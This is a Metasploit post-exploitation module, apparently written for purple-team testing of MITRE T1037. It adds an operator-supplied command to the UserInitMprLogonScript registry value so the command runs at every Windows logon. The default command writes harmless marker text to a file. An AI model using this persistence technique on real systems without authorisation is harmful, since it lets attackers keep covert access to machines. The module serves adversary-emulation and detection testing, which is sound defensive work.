##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Priv

    def initialize(info={})
      super(update_info(info,
                        'Name'          => 'Logon Scripts (T1037) Windows - Purple Team',
                        'Description'   => %q{
                          Persistence, Lateral Movement:
                          Windows allows logon scripts to be run whenever a specific user or group of users log into a system. The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.},
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Praetorian' ],
                        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1037' ] ],
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
                       ))
      register_options(
      [
        OptString.new("CMD", [true, "Command to execute on login.", "cmd /c echo T1037 > C:\\t1037.txt && whoami >> C:\\t1037.txt && date /t >> C:\\t1037.txt && time /t >> C:\\t1037.txt"]),
        OptBool.new("CLEANUP", [true, "Remove the registry key immediately after adding it.", false])
      ])
    end

    def run
    #
    # This module creates a registry key 'UserInitMprLogonScript' which executes a command
    # string specified by the operator.
    #
      begin
        raise "Module requires meterpreter session." unless session.type == "meterpreter"

        reg_base_key = "HKCU\\Environment"
        reg_base_val = "UserInitMprLogonScript"

        # add the logon script
        print_status("Adding #{datastore['CMD']} to #{reg_base_key}\\#{reg_base_val}")
        if registry_setvaldata(reg_base_key, reg_base_val, datastore['CMD'], "REG_SZ")
          print_good("Success! To test persistence, log out and then log in.")
        else
          raise 'Failure adding registry entry.'
        end

        # cleanup if we need to
        if datastore['CLEANUP']
          print_status("Deleting added key.")
          registry_deleteval(reg_base_key, reg_base_val)
        end

        print_good("Module T1037W execution successful.")

      rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1037W execution failed.")
      end

    end
  end
